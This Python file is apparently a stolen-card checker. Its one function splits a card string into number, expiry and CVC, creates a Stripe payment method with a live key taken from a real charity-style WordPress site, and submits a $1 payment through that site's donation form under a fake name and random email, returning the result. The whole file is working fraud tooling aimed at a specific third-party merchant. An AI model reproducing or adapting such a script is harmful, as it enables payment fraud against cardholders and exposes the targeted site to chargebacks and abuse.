import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 4)
	random2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F73e88c4136%3B+stripe-js-v3%2F73e88c4136%3B+card-element&referrer=https%3A%2F%2Flivingthepotential.com&time_on_page=44141&client_attribution_metadata[client_session_id]=2f04e9fd-9afc-4743-b629-9b4d3a752bc3&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51AfQPwKZnZBcEwtqPl8pdfMWrMnWEQgCARUgFv8jTZjwFnLBPPHYOfUNqfkSfJg0FxHrWvNeustDGiW9FekBzyTN00leL4wiWJ'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2026-02-04%2001%3A23%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Flivingthepotential.com%2Fbest-life-now-251227%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_first_add': 'fd%3D2026-02-04%2001%3A23%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Flivingthepotential.com%2Fbest-life-now-251227%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flivingthepotential.com%2Fbest-life-now-251227%2F',
	    'wp_llms_session_68a85c1429eda285652edb3d3e4c3947': '26cc926d950380c251fc07fef01348c1%7C%7C1770189803%7C%7C1770186203%7C%7C90d7d8cc3ace5f470958f06d0e1769f6',
	    '__stripe_mid': '31aa8fd5-ecf5-465a-b3a2-3a851d79de36c2aa81',
	    '__stripe_sid': 'd66b224a-b443-4df3-82d3-a0f05323055a9ba718',
	}
	
	headers = {
	    'authority': 'livingthepotential.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-04%2001%3A23%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Flivingthepotential.com%2Fbest-life-now-251227%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-02-04%2001%3A23%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Flivingthepotential.com%2Fbest-life-now-251227%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flivingthepotential.com%2Fbest-life-now-251227%2F; wp_llms_session_68a85c1429eda285652edb3d3e4c3947=26cc926d950380c251fc07fef01348c1%7C%7C1770189803%7C%7C1770186203%7C%7C90d7d8cc3ace5f470958f06d0e1769f6; __stripe_mid=31aa8fd5-ecf5-465a-b3a2-3a851d79de36c2aa81; __stripe_sid=d66b224a-b443-4df3-82d3-a0f05323055a9ba718',
	    'origin': 'https://livingthepotential.com',
	    'referer': 'https://livingthepotential.com/best-life-now-251227/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1770168246507',
	}
	
	data = {
	    'data': f'item_76__fluent_sf=&__fluent_form_embded_post_id=38483&_fluentform_76_fluentformnonce=d8655c2f0a&_wp_http_referer=%2Fbest-life-now-251227%2F&names%5Bfirst_name%5D=Gen&names%5Blast_name%5D=Paypal&email=genpaypal{random1}{random2}%40gmail.com&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '76',
	}
	
	response = requests.post(
	    'https://livingthepotential.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
